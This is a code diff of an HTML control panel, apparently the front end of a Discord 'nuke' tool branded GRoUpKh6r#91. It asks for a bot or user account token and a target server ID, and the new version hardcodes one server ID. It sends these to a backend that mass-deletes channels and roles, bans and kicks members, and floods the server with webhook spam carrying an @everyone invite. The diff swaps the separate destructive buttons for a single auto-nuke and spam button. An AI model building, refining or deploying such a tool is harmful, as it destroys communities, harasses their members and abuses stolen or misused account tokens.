@@ -3,7 +3,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>GRoUpKh6r#91 | Nuke & Control Center</title>
+    <title>GRoUpKh6r#91 | Nuke & Instant Webhook Engine</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
         body { background: #07090e; color: #f3f4f6; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
@@ -16,83 +16,75 @@
         input, select, textarea { width: 100%; padding: 12px; background: #1f2937; border: 1px solid #374151; border-radius: 8px; color: #fff; margin-bottom: 15px; font-size: 14px; }
         input:focus, textarea:focus { border-color: #ef4444; outline: none; box-shadow: 0 0 8px rgba(239, 68, 68, 0.4); }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; margin-top: 15px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 15px; }
         button { background: #1f2937; color: #fff; border: 1px solid #374151; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; text-align: center; }
         button:hover { background: #ef4444; border-color: #dc2626; transform: translateY(-2px); box-shadow: 0 4px 15px rgba(239, 68, 68, 0.5); }
         .danger-btn { background: #7f1d1d; border-color: #991b1b; }
         .danger-btn:hover { background: #991b1b; }
-        #console { background: #030712; border: 1px solid #1f2937; border-radius: 8px; padding: 15px; height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #4ade80; margin-top: 20px; }
+        #console { background: #030712; border: 1px solid #1f2937; border-radius: 8px; padding: 15px; height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #4ade80; margin-top: 20px; }
         audio { width: 100%; margin-top: 10px; border-radius: 8px; }
     </style>
 </head>
 <body>
 
     <header>
-        <h1>GRoUpKh6r#91 Ultimate Control Panel</h1>
-        <div class="watermark">Designed for dj | High-Speed Token & Nuke Engine</div>
+        <h1>GRoUpKh6r#91 Control Center</h1>
+        <div class="watermark">Server ID: 1557017152802783268 | Designed for dj</div>
     </header>
 
     <div class="container">
-        <!-- مشغل الموسيقى الحماسي (راب درب مهالك / بديل مضمون) -->
+        <!-- راب أجنبي عالمي حماسي ومضمون التشغيل -->
         <div class="section">
-            <label>مشغل الأغنية الحماسية (درب مهالك / راب)</label>
+            <label>مشغل الصوت (Hip-Hop / Rap Stream)</label>
             <audio controls autoplay loop>
-                <!-- رابط مباشر مضمّن يشتغل فوراً دون مشاكل حظر يوتيوب -->
-                <source src="https://cdns.us.streamaudio.com:8243/stream" type="audio/mp4">
-                <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3" type="audio/mpeg">
+                <source src="https://stream.zeno.fm/f3wvbbqmdg8uv" type="audio/mpeg">
+                <source src="https://icecast.omroep.nl/funx-hiphop-bb" type="audio/mpeg">
                 متصفحك لا يدعم مشغل الصوت.
             </audio>
         </div>
 
         <div class="grid">
             <div class="section">
-                <label>Token Type (نوع التوكن)</label>
+                <label>Token Type</label>
                 <select id="tokenType">
                     <option value="Bot">Bot Token</option>
-                    <option value="User">User Token (Account)</option>
+                    <option value="User">User Token</option>
                 </select>
             </div>
             <div class="section">
-                <label>Discord Token (توكن الحساب أو البوت)</label>
+                <label>Discord Token</label>
                 <input type="password" id="token" placeholder="أدخل التوكن هنا...">
             </div>
         </div>
 
         <div class="section">
-            <label>Server ID (أيدي السيرفر المستهدف)</label>
-            <input type="text" id="guildId" placeholder="123456789012345678">
+            <label>Server ID (Guild ID)</label>
+            <input type="text" id="guildId" value="1557017152802783268" placeholder="أيدي السيرفر">
         </div>
 
         <div class="grid">
             <div class="section">
-                <label>Target Name (اسم الرومات، الرتب، الأعضاء، السيرفر)</label>
-                <input type="text" id="targetName" value="vanta-nuke-x">
+                <label>Target Name (Channels/Roles/Server Name)</label>
+                <input type="text" id="targetName" value="GRoUpKh6r-nuke">
             </div>
             <div class="section">
-                <label>Webhook Name (اسم الويب هوك للسبام)</label>
+                <label>Webhook Name</label>
                 <input type="text" id="webhookName" value="GRoUpKh6r-Spam">
             </div>
         </div>
 
         <div class="section">
-            <label>Spam Payload Message (رسالة السبام التي لا تتوقف)</label>
+            <label>Spam Payload Message (رسالة السبام التلقائية)</label>
             <textarea id="spamMessage" rows="2">@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP</textarea>
         </div>
 
-        <label>Control Commands (الأوامر السريعة بالإنجليزية)</label>
+        <label>Execution Panel</label>
         <div class="btn-grid">
-            <button onclick="runAction('execute_all')" class="danger-btn">⚡ LAUNCH FULL NUKE (تنفيذ شامل)</button>
-            <button onclick="runAction('create_channels')">Create Channels</button>
-            <button onclick="runAction('delete_channels')" class="danger-btn">Delete All Channels</button>
-            <button onclick="runAction('create_roles')">Create Roles</button>
-            <button onclick="runAction('delete_roles')" class="danger-btn">Delete All Roles</button>
-            <button onclick="runAction('rename_server')">Rename Server</button>
-            <button onclick="runAction('rename_members')" class="danger-btn">Rename All Members</button>
-            <button onclick="runAction('ban_all')" class="danger-btn">Ban All Members</button>
-            <button onclick="runAction('kick_all')" class="danger-btn">Kick All Members</button>
+            <button onclick="runAction('auto_nuke_spawn')" class="danger-btn">⚡ LAUNCH AUTO-NUKE & INSTANT WEBHOOK SPAM (تشغيل شامل وتلقائي)</button>
+            <button onclick="runAction('stop_all_spam')">Stop All Spam Loops (إيقاف السبام)</button>
         </div>
 
-        <div id="console">[7bl] System ready. Group: GRoUpKh6r#91. Awaiting command execution...</div>
+        <div id="console">[7bl] System ready. Group: GRoUpKh6r#91. Guild ID locked: 1557017152802783268</div>
     </div>
 
     <script>
@@ -104,24 +96,22 @@
 
         async function runAction(action) {
             const token = document.getElementById('token').value.trim();
-            const tokenType = document.getElementById('tokenType').value;
             const guildId = document.getElementById('guildId').value.trim();
             const targetName = document.getElementById('targetName').value;
             const webhookName = document.getElementById('webhookName').value;
             const spamMessage = document.getElementById('spamMessage').value;
 
             if(!token || !guildId) {
-                alert('الرجاء إدخال التوكن وأيدي السيرفر أولاً!');
+                alert('الرجاء إدخال التوكن وأيدي السيرفر!');
                 return;
             }
 
-            log(`Executing [${action}] with target name: "${targetName}"...`);
-            
+            log(`Executing [${action}]...`);
             try {
                 const res = await fetch('/api/execute', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token, tokenType, guildId, targetName, webhookName, spamMessage })
+                    body: JSON.stringify({ token, guildId, targetName, webhookName, spamMessage, action })
                 });
                 const data = await res.json();
                 if(data.success) {
